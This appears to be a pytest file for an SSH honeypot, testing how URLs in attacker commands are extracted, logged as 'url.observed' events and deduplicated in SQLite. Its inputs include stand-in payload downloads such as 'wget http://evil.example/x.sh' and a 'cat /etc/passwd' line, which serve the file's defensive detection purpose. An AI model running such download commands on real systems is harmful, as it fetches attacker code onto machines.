"""Tests for URL extraction and ``url.observed`` events (Commit 13).

Extracts URLs from attacker commands (wget/curl/raw http(s)), emits
``url.observed`` events, and deduplicates them into the ``urls`` SQLite table.
No real network access is ever used.
"""

import socket
import sys
import tempfile
from pathlib import Path
from unittest.mock import MagicMock

import pytest

# handlers.py imports paramiko at module load; stub it so the module is
# importable in this environment without a real SSH library.
sys.modules.setdefault("paramiko", MagicMock())
sys.modules.setdefault("paramiko.ssh_exception", MagicMock())

from honeypot.artifacts import extract_urls  # noqa: E402
from honeypot.logger import build_event  # noqa: E402
from honeypot.session import Session  # noqa: E402
from honeypot.shell import FakeShell  # noqa: E402
from honeypot.telemetry_store import TelemetryStore  # noqa: E402


class TestExtractUrls:
    def test_wget_http_url(self):
        urls = extract_urls("wget http://evil.example/x.sh")
        assert urls == [("http://evil.example/x.sh", "wget")]

    def test_curl_https_url(self):
        urls = extract_urls("curl https://evil.example/payload.sh")
        assert urls == [("https://evil.example/payload.sh", "curl")]

    def test_curl_with_output_flag(self):
        urls = extract_urls("curl -o /tmp/x.sh https://evil.example/payload.sh")
        assert urls == [("https://evil.example/payload.sh", "curl")]

    def test_wget_bare_host_path(self):
        urls = extract_urls("wget evil.example/x.sh")
        assert urls == [("evil.example/x.sh", "wget")]

    def test_raw_http_url_any_command(self):
        urls = extract_urls("echo http://example.com/shell.sh")
        assert urls == [("http://example.com/shell.sh", "raw")]

    def test_multiple_urls(self):
        urls = extract_urls("wget http://a.example/1.sh http://b.example/2.sh")
        assert len(urls) == 2
        assert urls[0] == ("http://a.example/1.sh", "wget")
        assert urls[1] == ("http://b.example/2.sh", "wget")

    def test_dedup_within_call(self):
        urls = extract_urls("echo http://example.com/x http://example.com/x")
        assert urls == [("http://example.com/x", "raw")]

    def test_ordinary_commands_no_urls(self):
        for cmd in ("pwd", "ls -la", "cat /etc/passwd", "whoami", "id",
                    "mkdir /tmp/x", "rm /tmp/f.txt"):
            assert extract_urls(cmd) == []

    def test_no_slash_dot_rejected(self):
        assert extract_urls("wget /tmp/localfile") == []
        assert extract_urls("wget ./relative") == []

    def test_trailing_punctuation_stripped(self):
        urls = extract_urls("wget http://evil.example/x.sh,")
        assert urls == [("http://evil.example/x.sh", "wget")]


class TestShellUrlObserved:
    @pytest.fixture
    def shell(self):
        session = Session(source_ip="10.0.0.9")
        session.source_port = 54321
        session.username = "user1"
        return FakeShell(session)

    @pytest.fixture
    def events(self, monkeypatch):
        captured = []

        def _log(event_type, session_id=None, source_ip=None, **extra):
            record = {"event_type": event_type, "session_id": session_id,
                      "source_ip": source_ip}
            record.update(extra)
            captured.append(record)

        monkeypatch.setattr("honeypot.artifacts.log_event", _log)
        return captured

    def _url_events(self, events):
        return [e for e in events if e.get("event_type") == "url.observed"]

    def test_wget_emits_url_observed(self, shell, events):
        out = shell.execute("wget http://evil.example/x.sh")
        assert "unable to resolve host" in out
        url_ev = self._url_events(events)
        assert len(url_ev) == 1
        assert url_ev[0]["url"] == "http://evil.example/x.sh"
        assert url_ev[0]["tool"] == "wget"
        assert url_ev[0]["command"] == "wget http://evil.example/x.sh"

    def test_curl_emits_url_observed(self, shell, events):
        shell.execute("curl https://evil.example/payload.sh")
        url_ev = self._url_events(events)
        assert len(url_ev) == 1
        assert url_ev[0]["url"] == "https://evil.example/payload.sh"
        assert url_ev[0]["tool"] == "curl"

    def test_raw_http_url_emits_url_observed(self, shell, events):
        shell.execute("echo http://example.com/shell.sh")
        url_ev = self._url_events(events)
        assert len(url_ev) == 1
        assert url_ev[0]["url"] == "http://example.com/shell.sh"
        assert url_ev[0]["tool"] == "raw"

    def test_ordinary_command_no_url_event(self, shell, events):
        shell.execute("pwd")
        shell.execute("ls")
        shell.execute("echo hello")
        assert self._url_events(events) == []

    def test_dedup_within_session(self, shell, events):
        shell.execute("wget http://evil.example/x.sh")
        shell.execute("wget http://evil.example/x.sh")
        url_ev = self._url_events(events)
        # Two command executions -> two url.observed events (dedup is at the
        # SQLite urls table level, not the event level).
        assert len(url_ev) == 2

    def test_events_carry_session_identity(self, shell, events):
        shell.execute("wget http://evil.example/x.sh")
        ev = self._url_events(events)[0]
        assert ev["session_id"] == shell.session.session_id
        assert ev["source_ip"] == "10.0.0.9"
        assert ev["source_port"] == 54321
        assert ev["username"] == "user1"

    def test_no_real_socket_is_opened(self, shell, events, monkeypatch):
        def boom(*_args, **_kwargs):
            raise AssertionError("socket.socket must not be called")

        monkeypatch.setattr(socket, "socket", boom)
        shell.execute("wget http://evil.example/x.sh")
        assert len(self._url_events(events)) == 1

    def test_dotted_name_passthrough(self):
        event = build_event(
            "url.observed",
            session_id="s1",
            source_ip="10.0.0.9",
            url="http://evil.example/x.sh",
            tool="wget",
            command="wget http://evil.example/x.sh",
        )
        assert event["event_type"] == "url.observed"
        assert event.get("legacy_event_type") is None
        assert event["url"] == "http://evil.example/x.sh"
        assert event["tool"] == "wget"



class TestUrlStoreDedup:
    @pytest.fixture
    def store(self):
        db_path = Path(tempfile.mkdtemp()) / "test_urls.db"
        store = TelemetryStore(db_path=str(db_path))
        store.open()
        yield store
        store.close()

    def test_first_sighting_inserts(self, store):
        store.log_url("http://evil.example/x.sh", "2026-01-01T00:00:00")
        rows = store._query_all(
            "SELECT url, first_seen, last_seen, times_seen FROM urls"
        )
        assert len(rows) == 1
        assert rows[0] == ("http://evil.example/x.sh",
                           "2026-01-01T00:00:00",
                           "2026-01-01T00:00:00", 1)

    def test_repeat_sighting_increments_times_seen(self, store):
        store.log_url("http://evil.example/x.sh", "2026-01-01T00:00:00")
        store.log_url("http://evil.example/x.sh", "2026-01-02T00:00:00")
        rows = store._query_all(
            "SELECT url, first_seen, last_seen, times_seen FROM urls"
        )
        assert len(rows) == 1
        assert rows[0][0] == "http://evil.example/x.sh"
        assert rows[0][1] == "2026-01-01T00:00:00"  # first_seen preserved
        assert rows[0][2] == "2026-01-02T00:00:00"  # last_seen updated
        assert rows[0][3] == 2  # times_seen incremented

    def test_multiple_urls_dedup_independently(self, store):
        store.log_url("http://a.example/1.sh", "2026-01-01T00:00:00")
        store.log_url("http://a.example/1.sh", "2026-01-02T00:00:00")
        store.log_url("http://b.example/2.sh", "2026-01-01T00:00:00")
        rows = store._query_all(
            "SELECT url, times_seen FROM urls ORDER BY url"
        )
        assert len(rows) == 2
        assert rows[0] == ("http://a.example/1.sh", 2)
        assert rows[1] == ("http://b.example/2.sh", 1)

